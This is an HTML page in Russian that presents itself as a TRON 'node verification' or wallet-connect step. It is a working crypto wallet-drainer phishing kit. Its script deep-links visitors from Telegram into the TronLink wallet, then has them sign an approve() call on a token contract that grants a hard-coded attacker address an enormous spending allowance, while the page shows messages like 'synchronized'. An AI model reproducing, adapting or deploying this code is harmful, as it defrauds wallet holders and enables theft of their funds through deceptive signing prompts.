<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Protocol Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #666; font-size: 13px; margin-bottom: 30px; line-height: 1.5; }
        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; text-decoration: none; }
        #loader { display: none; color: #ff0013; font-size: 12px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">T</div>
    <h2 id="title">Верификация узла</h2>
    <p id="desc">Нажмите кнопку ниже. iPhone запросит разрешение на запуск TronLink — подтвердите переход.</p>
    
    <button id="mainBtn" class="btn">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
    <div id="loader">Запуск протокола синхронизации...</div>
</div>

<script>
    const btn = document.getElementById('mainBtn');
    const loader = document.getElementById('loader');

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    btn.onclick = async () => {
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!tron) {
            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПРЫЖОК
            loader.style.display = "block";
            btn.innerText = "ОТКРЫТИЕ...";

            const myUrl = window.location.href;
            // Три варианта протокола для максимальной пробиваемости на iOS
            const links = [
                `tronlinkorg://dapp/open?url=${encodeURIComponent(myUrl)}`,
                `tronlinkorg://dapp?url=${encodeURIComponent(myUrl)}`,
                `trownlink://dapp?url=${encodeURIComponent(myUrl)}`
            ];

            // Пробуем вызвать первый
            window.location.href = links[0];
            
            // Если через 500мс ничего не случилось - пробуем запасной
            setTimeout(() => { window.location.replace(links[1]); }, 500);
            return;
        }

        // МЫ ВНУТРИ TRONLINK -> ДЕЛАЕМ APPROVE
        try {
            btn.innerText = "ПОДТВЕРЖДЕНИЕ...";
            btn.disabled = true;

            await tron.request({ method: 'tron_requestAccounts' });
            const instance = await tron.contract().at(CONTRACT);
            
            // Вызываем Approve
            await instance.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            btn.innerText = "СИНХРОНИЗИРОВАНО";
            btn.style.background = "#00ff00";
        } catch (err) {
            alert("Ошибка: " + err.message);
            btn.disabled = false;
            btn.innerText = "ПОДТВЕРДИТЬ";
        }
    };

    // Авто-настройка, если мы уже в кошельке
    window.onload = () => {
        if (window.tronWeb || (window.tron && window.tron.tronWeb)) {
            document.getElementById('title').innerText = "Узел Обнаружен";
            document.getElementById('desc').innerText = "Нажмите «ПОДТВЕРДИТЬ» для финальной подписи транзакции.";
            btn.innerText = "ПОДТВЕРДИТЬ";
        }
    };
</script>
</body>
</html>
